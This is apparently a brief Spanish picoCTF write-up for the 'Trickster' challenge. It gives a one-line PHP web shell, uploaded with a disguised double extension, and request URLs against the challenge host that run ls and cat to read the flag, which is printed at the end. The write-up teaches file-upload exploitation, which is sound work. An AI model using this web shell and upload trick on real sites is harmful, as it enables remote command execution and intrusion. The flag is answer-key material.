### Trickster

### DESCRIPCIÓN


### SOLUCIÓN

- Usaremos el web shell:

`<?php if(isset($_REQUEST['cmd']))      system($_REQUEST['cmd']); ?>`

- Lo subimos a la aplicación
- Ejecutamos comandos usando webshell, que asumimos se guardo en /uploads

`http://atlas.picoctf.net:58001/uploads/shell.png.php?cmd=ls http://atlas.picoctf.net:58001/uploads/shell.png.php?cmd=ls .. (http://atlas.picoctf.net:58001/uploads/webshell.png.phpcmd=%20cat%20../MFRDAZLDMUYDG.txt`

picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
### NOTAS ADICIONALES


### REFERENCIAS